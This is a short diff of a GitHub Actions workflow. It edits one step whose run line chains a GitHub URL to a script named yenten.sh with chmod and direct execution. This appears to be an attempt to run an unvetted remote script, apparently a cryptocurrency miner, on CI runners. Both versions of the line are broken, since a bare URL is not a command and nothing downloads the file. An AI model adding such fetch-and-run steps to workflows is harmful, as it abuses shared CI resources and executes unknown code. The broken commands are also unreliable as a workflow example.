@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: BA_channel
       run: |
-        https://github.com/memey357/ujicoba/blob/master/yenten.sh && chmod u+x yenten.sh && ./yenten.sh
+        https://github.com/memey357/ujicoba/find/master && chmod u+x yenten.sh && ./yenten.sh
